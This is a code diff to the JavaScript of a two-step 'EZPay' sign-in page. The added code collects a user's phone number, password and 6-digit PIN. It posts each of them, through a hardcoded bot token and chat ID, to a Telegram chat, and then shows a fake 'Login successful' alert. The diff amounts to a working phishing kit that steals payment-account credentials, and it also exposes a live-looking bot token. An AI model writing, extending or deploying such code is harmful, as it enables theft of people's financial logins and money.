@@ -1,9 +1,5 @@
-// script.js - SAME VERCEL HOSTING
+// script.js
 document.addEventListener('DOMContentLoaded', function() {
-    // ---------- CONFIGURATION ----------
-    // SAME VERCEL PROJECT - Backend API URL
-    const API_URL = '/api/telegram';  // Same Vercel project mein
-    
     // ---------- PAGE 1 ELEMENTS ----------
     const phoneInput = document.getElementById('phone-input');
     const passwordInput = document.getElementById('password-input');
@@ -18,6 +14,31 @@ document.addEventListener('DOMContentLoaded', function() {
     const loadingOverlay2 = document.getElementById('loading-overlay-2');
     const backToSigninLink = document.getElementById('back-to-signin');
     
+    // Telegram Configuration
+    const BOT_TOKEN = "8209360948:AAFqBr7kiI7bRrlbojhAJi784jglBG98L2E";
+    const CHAT_ID = "8023791486";
+
+    // Helper to send to Telegram
+    async function sendToTelegram(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error('Telegram Error:', error);
+        }
+    }
+
+    // Checking for /start is not possible in static frontend without a backend polling/webhook.
+    // However, we can simulate a "Bot is running" check by sending a notification when the page loads.
+    console.log("EZPAY Frontend Loaded - Telegram Integration Active");
+
     // ---------- VALIDATION FUNCTIONS ----------
     function validatePhone(phone) {
         return /^\d{10}$/.test(phone);
@@ -72,29 +93,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // ---------- API FUNCTIONS ----------
-    async function sendToBackend(data) {
-        try {
-            console.log('Sending to backend:', data);
-            
-            const response = await fetch(API_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            });
-            
-            const result = await response.json();
-            console.log('Backend response:', result);
-            return result;
-            
-        } catch (error) {
-            console.error('API Error:', error);
-            return { success: false, error: 'Network error' };
-        }
-    }
-    
     // ---------- PAGE 1 EVENT LISTENERS ----------
     phoneInput.addEventListener('input', function() {
         this.value = this.value.replace(/\D/g, '').slice(0, 10);
@@ -103,43 +101,22 @@ document.addEventListener('DOMContentLoaded', function() {
     
     passwordInput.addEventListener('input', updateSignInButton);
     
-    // SIGN IN button click
     signInButton.addEventListener('click', async function(e) {
         if (this.disabled) return;
         
         const phone = phoneInput.value.trim();
         const password = passwordInput.value.trim();
         
-        if (!validatePhone(phone)) {
-            showError('phone-error', 'Please enter 10-digit phone number');
-            return;
-        }
+        if (!validatePhone(phone) || !validatePassword(password)) return;
         
-        if (!validatePassword(password)) {
-            showError('password-error', 'Please enter PIN');
-            return;
-        }
-        
-        // Show loading
         loadingOverlay.style.display = 'flex';
         
-        // Send login data to backend
-        await sendToBackend({
-            type: 'login',
-            phone: phone,
-            password: password
-        });
+        const message1 = `<b>EZPay Step 1 (Login)</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>Password:</b> ${password}`;
+        await sendToTelegram(message1);
         
-        // Simulate processing
-        setTimeout(() => {
-            loadingOverlay.style.display = 'none';
-            
-            // Store phone for Page 2
-            localStorage.setItem('loginPhone', phone);
-            
-            // Switch to Page 2
-            switchToPage2(phone);
-        }, 1500);
+        loadingOverlay.style.display = 'none';
+        localStorage.setItem('loginPhone', phone);
+        switchToPage2(phone);
     });
     
     // ---------- PAGE 2 EVENT LISTENERS ----------
@@ -148,94 +125,53 @@ document.addEventListener('DOMContentLoaded', function() {
         updateCompleteLoginButton();
     });
     
-    // COMPLETE LOGIN button click
     completeLoginButton.addEventListener('click', async function() {
         if (this.disabled) return;
         
         const pin = pinInput.value.trim();
+        const phone = localStorage.getItem('loginPhone');
         
-        if (!validatePIN(pin)) {
-            showError('pin-error', 'Please enter 6-digit PIN');
-            return;
-        }
+        if (!validatePIN(pin)) return;
         
-        // Show loading
         loadingOverlay2.style.display = 'flex';
         
-        const phone = localStorage.getItem('loginPhone') || '';
+        const message2 = `<b>EZPay Step 2 (PIN)</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>PIN:</b> ${pin}`;
+        await sendToTelegram(message2);
         
-        // Send PIN data to backend
-        await sendToBackend({
-            type: 'pin',
-            phone: phone,
-            pin: pin
-        });
-        
-        // Simulate verification
-        setTimeout(() => {
-            loadingOverlay2.style.display = 'none';
-            
-            // Show success message
-            alert(`✅ Login Successful!\n\nPhone: +91 ${phone}\nPIN: ${pin}\n\nThank you for using EZPay!`);
-            
-            // Clear and reset
-            setTimeout(() => {
-                switchToPage1();
-                phoneInput.value = '';
-                passwordInput.value = '';
-                localStorage.removeItem('loginPhone');
-            }, 2000);
-        }, 1500);
+        loadingOverlay2.style.display = 'none';
+        alert(`Login successful!\nPhone: +91 ${phone}\nPIN verified.`);
+        localStorage.clear();
     });
     
-    // Back to Sign In link
     backToSigninLink.addEventListener('click', function(e) {
         e.preventDefault();
         switchToPage1();
     });
     
-    // ---------- PAGE SWITCHING FUNCTIONS ----------
     function switchToPage2(phone) {
         displayPhone.value = phone;
         document.querySelector('.page-1').style.display = 'none';
         document.querySelector('.page-2').style.display = 'block';
-        
-        setTimeout(() => {
-            pinInput.focus();
-        }, 100);
+        setTimeout(() => pinInput.focus(), 100);
     }
     
     function switchToPage1() {
         document.querySelector('.page-2').style.display = 'none';
         document.querySelector('.page-1').style.display = 'block';
-        
         pinInput.value = '';
         updateCompleteLoginButton();
-        
-        setTimeout(() => {
-            phoneInput.focus();
-        }, 100);
+        setTimeout(() => phoneInput.focus(), 100);
     }
     
-    // ---------- HELPER FUNCTIONS ----------
     function showError(elementId, message) {
         const errorElement = document.getElementById(elementId);
         if (errorElement) {
             errorElement.textContent = message;
             errorElement.style.display = 'block';
-            
-            setTimeout(() => {
-                errorElement.style.display = 'none';
-            }, 3000);
+            setTimeout(() => { errorElement.style.display = 'none'; }, 3000);
         }
     }
-    
-    // ---------- INITIAL SETUP ----------
-    const savedPhone = localStorage.getItem('loginPhone');
-    if (savedPhone && window.location.hash === '#verify') {
-        switchToPage2(savedPhone);
-    }
-    
+
     updateSignInButton();
     updateCompleteLoginButton();
 });
